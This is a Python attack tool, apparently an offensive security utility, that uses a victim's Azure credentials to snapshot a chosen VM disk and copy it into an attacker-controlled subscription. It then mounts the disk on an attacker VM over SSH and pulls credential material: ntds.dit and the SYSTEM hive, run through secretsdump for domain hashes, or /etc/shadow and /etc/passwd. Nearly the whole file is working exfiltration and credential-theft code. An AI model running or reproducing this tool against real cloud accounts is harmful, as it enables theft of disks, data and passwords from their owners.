import time
import uuid
from pathlib import Path

import paramiko
from azure.common.client_factory import get_client_from_auth_file
from azure.mgmt.compute import ComputeManagementClient
from azure.mgmt.compute.v2016_04_30_preview.models import DiskCreateOption
from azure.mgmt.network import NetworkManagementClient
from azure.mgmt.resource import ResourceManagementClient
from azure.mgmt.storage import StorageManagementClient
from azure.storage.blob import BlockBlobService


class AzureCloudCopy:

    def __init__(self, options):
        self.region = options["azureregion"]
        self.vmPassword = options["attackinstancepassword"]
        self.myAvailabilitySetName = "av-" + str(uuid.uuid4())
        self.myIpAddressName = "myip-" + str(uuid.uuid4())
        self.myVmNetName = "myvmnet-" + str(uuid.uuid4())
        self.mySubetName = "mysubnet-" + str(uuid.uuid4())
        self.myIpConfig = "myipconfig-" + str(uuid.uuid4())
        self.myNic = "mynic-" + str(uuid.uuid4())
        self.vmName = "vm-" + str(uuid.uuid4())
        self.resourceId = ''
        self.controlledSnapshot = None
        self.vm = None
        self.diskId = ''

        self.victimComputeClient = get_client_from_auth_file(ComputeManagementClient,
                                                             Path(options['victimauthfile']).absolute())
        self.victimResourceClient = get_client_from_auth_file(ResourceManagementClient,
                                                              Path(options['victimauthfile']).absolute())
        self.attackerComputeClient = get_client_from_auth_file(ComputeManagementClient,
                                                               Path(options['attackerauthfile']).absolute())
        self.attackerStorageClient = get_client_from_auth_file(StorageManagementClient,
                                                               Path(options['attackerauthfile']).absolute())
        self.network_client = get_client_from_auth_file(NetworkManagementClient,
                                                        Path(options['attackerauthfile']).absolute())
        self.clientContext = self.victimComputeClient

    def getStorageAccounts(self):
        return list(self.attackerStorageClient.storage_accounts.list_by_resource_group(self.resourceId))

    def getStorageAccountKey(self, storageAccountName):
        return self.attackerStorageClient.storage_accounts.list_keys(self.resourceId, storageAccountName).keys[0].value

    def getStorageAccountContainers(self, storageAccountName, storageAccountKey):
        blockBlobService = BlockBlobService(account_name=storageAccountName, account_key=storageAccountKey)
        return list(blockBlobService.list_containers())

    def getResourceGroups(self):
        return list(self.victimResourceClient.resource_groups.list())

    def getVMs(self):
        return list(self.clientContext.virtual_machines.list(self.resourceId))

    def createShareableSnapshot(self, resourceId, snapshotName):
        # instances, dcDSnapshot
        poller = self.clientContext.snapshots.grant_access(resourceId, snapshotName, "read", 3600)

        while not poller.done():
            poller.wait(10)

        return poller.result().access_sas

    def createSnapshot(self, resourceId, snapshotName, diskId):
        poller = self.clientContext.snapshots.create_or_update(resourceId,
                                                               snapshotName,
                                                               self.clientContext.snapshots.models.Snapshot(
                                                                   location=self.region,
                                                                   creation_data=self.clientContext.snapshots.models.CreationData(
                                                                       create_option="Copy",
                                                                       source_uri=diskId
                                                                   )
                                                               )
                                                               )
        while not poller.done():
            poller.wait(10)
        # returns a Snapshot object
        return poller.result()

    def copySnapshotToAttacker(self, storageAccount, storageKey, containerName, blobName, snapshotSas):
        blockBlobService = BlockBlobService(account_name=storageAccount, account_key=storageKey)
        copyProperties = blockBlobService.copy_blob(containerName, blobName, snapshotSas)
        while copyProperties.status != "success":
            copyProperties = blockBlobService.get_blob_properties(containerName, blobName).properties.copy
            print(copyProperties.status + ":" + copyProperties.progress)
            time.sleep(10)
        return copyProperties

    def convertCopiedBlobToSnapshot(self, resourceId, storageAccount, containerName, blobId, snapshotId):
        poller = self.clientContext.snapshots.create_or_update(resourceId,
                                                               snapshotId,
                                                               self.clientContext.snapshots.models.Snapshot(
                                                                   location=self.region,
                                                                   creation_data=self.clientContext.snapshots.models.CreationData(
                                                                       create_option="Import",
                                                                       source_uri=storageAccount.primary_endpoints.blob + containerName + "/" + blobId,
                                                                       storage_account_id=storageAccount.id
                                                                   )
                                                               )
                                                               )
        while not poller.done():
            poller.wait(10)
        # returns a Snapshot object
        return poller.result()

    def pickResourceGroup(self):
        resourceGroups = self.getResourceGroups()
        for index, resourceGroup in enumerate(resourceGroups):
            print(str(index) + ' - ' + resourceGroup.name)

        inp = input("which resource group is our target instance under? (# or exit to go back) ")
        if inp != 'exit':
            try:
                self.resourceId = resourceGroups[int(inp)].name
                return True
            except ValueError:
                return False
        else:
            return False

    def pickVmToSteal(self):
        vms = self.getVMs()
        for index, vm in enumerate(vms):
            print(str(index) + ' - ' + vm.name)

        inp = input("which virtual machine are we stealing? (# or exit to go back) ")
        if inp != 'exit':
            try:
                instanceView = self.clientContext.virtual_machines.instance_view(self.resourceId, vms[int(inp)].name)
                for index, disk in enumerate(instanceView.disks):
                    print(str(index) + ' - ' + disk.name)

                inp = input("which disk are we stealing? (# or exit to go back) ")
                if inp != 'exit':
                    self.diskId = self.clientContext.disks.get(self.resourceId, instanceView.disks[int(inp)].name).id
                    return True
                else:
                    return False
            except ValueError:
                return False
        else:
            return False

    def generateSnapshot(self):

        # create a snapshot from selected vm disk
        snapshot = self.createSnapshot(self.resourceId, str(uuid.uuid4()), self.diskId)
        print("created the snapshot")

        # create shareable link to snapshot
        accessUrl = self.createShareableSnapshot(self.resourceId, snapshot.name)
        print("made snapshot shareable")

        # get storageaccounts on attacker subscription
        storageAccount = self.getStorageAccounts()[0]
        print("found valid storage account to receive snapshot")

        # get storageAccount key
        storageAccountKey = self.getStorageAccountKey(storageAccount.name)
        print("got key for storage account")

        # get containers
        containers = self.getStorageAccountContainers(storageAccount.name, storageAccountKey)
        print("found valid container inside storage account")

        # share snapshot blob with attacker account
        newBlobId = str(uuid.uuid4()) + ".vhd"
        sharedSnapshot = self.copySnapshotToAttacker(storageAccount.name, storageAccountKey, containers[0].name,
                                                     newBlobId, accessUrl)
        while sharedSnapshot.status != "success":
            print(sharedSnapshot.progress)
        print("successfully received snapshot. Switching to attacker context.")
        clientContext = self.attackerComputeClient

        # convert snapshot blob to real snapshot
        # print(convertCopiedBlobToSnapshot(resourceId, storageAccount, containers[0].name, "5f67cd67-cad7-486e-9300-2b7988d65ad2", str(uuid.uuid4())+".vhd"))
        poller = clientContext.snapshots.create_or_update(self.resourceId,
                                                          str(uuid.uuid4()) + ".vhd",
                                                          clientContext.snapshots.models.Snapshot(
                                                              location=self.region,
                                                              creation_data=clientContext.snapshots.models.CreationData(
                                                                  create_option="Import",
                                                                  source_uri=storageAccount.primary_endpoints.blob +
                                                                             containers[0].name + "/" + newBlobId,
                                                                  storage_account_id=storageAccount.id
                                                              )
                                                          )
                                                          )
        while not poller.done():
            poller.wait(10)
            # returns a Snapshot object
        self.controlledSnapshot = poller.result()
        print("successfully converted blog to snapshot. Now we can add it to a VM.")
        return True

    def create_availability_set(self, compute_client):
        avset_params = {
            'location': self.region,
            'sku': {'name': 'Aligned'},
            'platform_fault_domain_count': 3
        }
        compute_client.availability_sets.create_or_update(
            self.resourceId,
            self.myAvailabilitySetName,
            avset_params
        )

    def create_public_ip_address(self, network_client):
        public_ip_addess_params = {
            'location': self.region,
            'public_ip_allocation_method': 'Dynamic'
        }
        creation_result = network_client.public_ip_addresses.create_or_update(
            self.resourceId,
            self.myIpAddressName,
            public_ip_addess_params
        )

        return creation_result.result()

    def create_vnet(self, network_client):
        vnet_params = {
            'location': self.region,
            'address_space': {
                'address_prefixes': ['10.0.0.0/16']
            }
        }
        creation_result = network_client.virtual_networks.create_or_update(
            self.resourceId,
            self.myVmNetName,
            vnet_params
        )
        return creation_result.result()

    def create_subnet(self, network_client):
        subnet_params = {
            'address_prefix': '10.0.0.0/24'
        }
        creation_result = network_client.subnets.create_or_update(
            self.resourceId,
            self.myVmNetName,
            self.mySubetName,
            subnet_params
        )

        return creation_result.result()

    def create_nic(self, network_client):
        subnet_info = self.network_client.subnets.get(
            self.resourceId,
            self.myVmNetName,
            self.mySubetName
        )
        publicIPAddress = self.network_client.public_ip_addresses.get(
            self.resourceId,
            self.myIpAddressName
        )
        nic_params = {
            'location': self.region,
            'ip_configurations': [{
                'name': self.myIpConfig,
                'public_ip_address': publicIPAddress,
                'subnet': {
                    'id': subnet_info.id
                }
            }]
        }
        creation_result = self.network_client.network_interfaces.create_or_update(
            self.resourceId,
            self.myNic,
            nic_params
        )

        return creation_result.result()

    def create_vm(self, network_client, compute_client):
        nic = network_client.network_interfaces.get(
            self.resourceId,
            self.myNic
        )
        avset = compute_client.availability_sets.get(
            self.resourceId,
            self.myAvailabilitySetName
        )
        vm_parameters = {
            'location': self.region,
            'os_profile': {
                'computer_name': self.vmName,
                'admin_username': 'azureuser',
                'admin_password': self.vmPassword
            },
            'hardware_profile': {
                'vm_size': 'Standard_DS1'
            },
            'storage_profile': {
                'image_reference': {
                    'publisher': 'Canonical',
                    'offer': 'UbuntuServer',
                    'sku': '18.04-LTS',
                    'version': 'latest'
                }
            },
            'network_profile': {
                'network_interfaces': [{
                    'id': nic.id
                }]
            },
            'availability_set': {
                'id': avset.id
            }
        }
        creation_result = compute_client.virtual_machines.create_or_update(
            self.resourceId,
            self.vmName,
            vm_parameters
        )

        return creation_result.result()

    def createVmWithSnapshot(self):
        self.create_availability_set(self.attackerComputeClient)
        print("created availability set")
        self.create_public_ip_address(self.network_client)
        print("created vm IP")
        self.create_vnet(self.network_client)
        print("created virtual network")
        self.create_subnet(self.network_client)
        print("created subnet")
        self.create_nic(self.network_client)
        print("created NIC")
        self.create_vm(self.network_client, self.attackerComputeClient)
        print("created VM")

        diskName = "stolen-" + str(uuid.uuid4())

        disk = self.attackerComputeClient.disks.create_or_update(resource_group_name=self.resourceId,
                                                                 disk_name=diskName,
                                                                 disk=self.attackerComputeClient.disks.models.Disk(
                                                                     location=self.region,
                                                                     creation_data=self.attackerComputeClient.disks.models.CreationData(
                                                                         create_option="Copy",
                                                                         source_resource_id=self.controlledSnapshot.id)))

        disk_resource = disk.result()
        print("created disk from snapshot")
        print(disk_resource.id)
        vm = self.attackerComputeClient.virtual_machines.get(self.resourceId, self.vmName)
        vm.storage_profile.data_disks.append({
            'lun': 1,
            'name': diskName,
            'create_option': DiskCreateOption.attach,
            'managed_disk': {
                'id': disk_resource.id
            }
        })

        vm_result = self.attackerComputeClient.virtual_machines.create_or_update(
            self.resourceId,
            self.vmName,
            vm)
        while vm_result.status() != "Succeeded":
            print(vm_result.status())
            time.sleep(10)

        print("attached disk to vm, time to get our creds")
        self.vm = vm_result
        return True

    def connectToInstance(self, instanceIp):
        connection = paramiko.SSHClient()
        connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("Connecting to instance")
        connected = False
        while not connected:
            try:
                connection.connect(hostname=instanceIp, username='azureuser', password=self.vmPassword)
                connected = True
            except paramiko.ssh_exception.NoValidConnectionsError:
                print("Can't connect yet, instance may still be warming up. Trying again in 10s")
                time.sleep(10)
            except TimeoutError:
                print("Timeout in connection, security rules are borked. Cleaning up")
                return None, None
        sftp = connection.open_sftp()
        return connection, sftp

    # SSH's into the instance mounts the DC snapshot copies the ntds.dit and SYSTEM file gives ownership to ec2-user
    # SFTP's into the instance and downloads the ntds.dit and SYSTEM file locally
    # runs impacket's secretsdump tool to recreate the hashes. Expects secretsdump to be on your path.
    def stealDCHashFiles(self):
        outfileUid = str(uuid.uuid4())
        connection, sftp = self.connectToInstance(
            self.network_client.public_ip_addresses.get(self.resourceId, self.myIpAddressName).ip_address)
        if connection and sftp:
            #   have to block on these calls to ensure they happen in order
            stdin, stdout, stderr = connection.exec_command(
                "sudo apt-get install ntfs-3g -y")
            stdout.channel.recv_exit_status()
            stdin, stdout, stderr = connection.exec_command(
                "sudo mkdir /winblows")
            print("made windows dir")
            stdout.channel.recv_exit_status()

            stdin, stdout, stderr = connection.exec_command(
                "sudo ntfsfix /dev/sdc2")
            print("fixing drive")
            stdout.channel.recv_exit_status()

            stdin, stdout, stderr = connection.exec_command(
                "sudo /bin/mount -r -t ntfs-3g /dev/sdc2 /winblows/")
            print("mounted the drive")
            stdout.channel.recv_exit_status()
            stdin, stdout, stderr = connection.exec_command(
                "sudo cp /winblows/Windows/NTDS/ntds.dit /home/azureuser/ntds.dit")
            print("copied ntds.dit")
            stdout.channel.recv_exit_status()
            stdin, stdout, stderr = connection.exec_command(
                "sudo cp /winblows/Windows/System32/config/SYSTEM /home/azureuser/SYSTEM")
            print("copied SYSTEM hive")
            stdout.channel.recv_exit_status()
            stdin, stdout, stderr = connection.exec_command(
                "sudo chown azureuser:azureuser /home/azureuser/ntds.dit;sudo chown azureuser:azureuser /home/azureuser/SYSTEM;")
            print("making sure we own the files")
            stdout.channel.recv_exit_status()
            print("finished configuring instance to grab Hash Files")
            print("Pulling the files...")
            try:
                sftp.get("/home/azureuser/SYSTEM", "./SYSTEM-" + outfileUid)
                print("SYSTEM registry hive file retrieval complete")
                sftp.get("/home/azureuser/ntds.dit", "./ntds.dit-" + outfileUid)
                print("ntds.dit registry hive file retrieval complete")
                sftp.close()
                connection.close()
                print("finally gonna run secretsdump!")
            except Exception:
                print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
            try:
                import platform
                import subprocess
                if platform.system() == "Windows":
                    subprocess.run(
                        ["C:\Python27\Scripts\secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds",
                         "./ntds.dit-" + outfileUid, "local",
                         "-outputfile", "secrets-" + outfileUid], shell=True)
                else:
                    subprocess.run(
                        ["secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds", "./ntds.dit-" + outfileUid,
                         "local",
                         "-outputfile", "secrets-" + outfileUid])
            except FileNotFoundError:
                print("hmm can't seem to find secretsdump on your path. Run this manually against the files.")

    def stealShadowPasswd(self):
        outfileUid = str(uuid.uuid4())
        connection, sftp = self.connectToInstance(
            self.network_client.public_ip_addresses.get(self.resourceId, self.myIpAddressName).ip_address)
        #   have to block on these calls to ensure they happen in order
        _, stdout, stderr = connection.exec_command("sudo mkdir /linux")
        stdout.channel.recv_exit_status()
        print(stderr.readlines())
        print("made directory")
        _, stdout, stderr = connection.exec_command("sudo mount /dev/sdc1 /linux/")
        stdout.channel.recv_exit_status()
        print(stderr.readlines())
        print("mounted the drive")
        _, stdout, stderr = connection.exec_command("sudo cp /linux/etc/shadow /home/azureuser/shadow")
        stdout.channel.recv_exit_status()
        print(stderr.readlines())
        print("copy shadow file")
        _, stdout, stderr = connection.exec_command("sudo cp /linux/etc/passwd /home/azureuser/passwd")
        stdout.channel.recv_exit_status()
        print(stderr.readlines())
        print("copy passwd file")
        _, stdout, stderr = connection.exec_command("sudo chown azureuser:azureuser /home/azureuser/*")
        print(stderr.readlines())
        print("change ownership of copied files")
        stdout.channel.recv_exit_status()
        print("finished configuring instance to grab Shadow and Passwd files")
        print("Pulling the files...")
        try:
            sftp.get("/home/azureuser/shadow", "./shadow-" + outfileUid)
            print("/etc/shadow file retrieval complete")
            sftp.get("/home/azureuser/passwd", "./passwd-" + outfileUid)
            print("/etc/passwd file retrieval complete")
            sftp.close()
            connection.close()
        except Exception:
            print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
